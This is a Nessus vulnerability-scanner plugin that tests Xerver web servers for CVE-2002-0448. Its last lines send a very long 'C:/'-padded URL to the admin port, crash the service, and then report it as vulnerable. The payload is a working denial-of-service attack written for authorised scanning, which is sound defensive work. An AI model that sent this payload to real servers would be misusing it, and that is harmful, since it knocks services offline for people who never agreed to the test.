#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CAN
#
# From Bugtraq :
# Date: Fri, 8 Mar 2002 18:39:39 -0500 ?
# From:"Alex Hernandez" <al3xhernandez@ureach.com> 


include("compat.inc");


if(description)
{
 script_id(11015);
 script_version("$Revision: 1.23 $");

 script_cve_id("CVE-2002-0448");
 script_bugtraq_id(4254);
 script_osvdb_id(6772);

 script_name(english:"Xerver Web Server < 2.20 Crafted C:/ Request Remote DoS");
 
 script_set_attribute(
  attribute:"synopsis",
  value:"The remote web server is prone to a denial of service attack."
 );
 script_set_attribute(attribute:"description", value:
"It is possible to crash the Xerver web server by sending a long URL
to its administration port." );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://seclists.org/bugtraq/2002/Mar/156"
 );
 script_set_attribute(
  attribute:"see_also", 
  value:"http://seclists.org/bugtraq/2002/Mar/218"
 );
 script_set_attribute(
  attribute:"solution", 
  value:"Upgrade to Xerver 2.20 or later."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2002/06/07");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/03/08");
 script_cvs_date("$Date: 2016/11/15 19:41:09 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_summary(english:"Xerver DoS");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 32123);
 exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:32123, embedded: 0);

soc = open_sock_tcp(port);
if (!soc) exit(1);
s = strcat('GET /', crap(data:"C:/", length:1500000), '\r\n\r\n');
send(socket:soc, data:s);
close(soc);

if (service_is_dead(port: port) > 0)
  security_warning(port);
